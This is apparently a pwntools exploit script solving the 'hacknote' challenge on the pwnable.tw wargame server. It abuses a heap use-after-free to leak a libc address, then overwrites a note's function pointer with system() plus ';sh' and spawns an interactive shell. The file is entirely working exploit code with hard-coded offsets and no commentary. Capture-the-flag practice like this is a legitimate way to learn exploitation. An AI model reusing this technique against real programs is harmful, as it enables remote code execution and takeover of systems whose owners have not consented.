#! /usr/bin/python
from pwn import *

def add(size,data):
	r.sendlineafter('Your choice :','1')
	r.sendlineafter('Note size :',str(size))
	r.sendlineafter('Content :',data)

def delete(index):
	r.sendlineafter('Your choice :','2')
	r.sendlineafter('Index :',str(index))

def print_note(index):
	r.sendlineafter('Your choice :','3')
	r.sendlineafter('Index :',str(index))


#r = process('./hacknote', env={'LD_PRELOAD':'./libc_32.so.6'})
r = remote('chall.pwnable.tw',10102)
#context.log_level='debug'
#gdb.attach(r,'b* 0x080488A5')

add(8,'AAAA')    # 0
add(256,'BBBB')  # 1
add(8,'AAAA')    # 2
delete(0)
delete(1)
delete(2)

add(256,'BBB')   # 3


####### leak libc #######
print_note(3)
r.recvuntil('BBB\n')
leak = u32(r.recv(4))
libc_base = leak - 1779632+ 0x2000
success('libc_base = '+hex(libc_base))

system_addr = libc_base + 239936

payload = p32(system_addr)
payload += ';sh'

add(8,payload)     # 4

print_note(1)

r.interactive()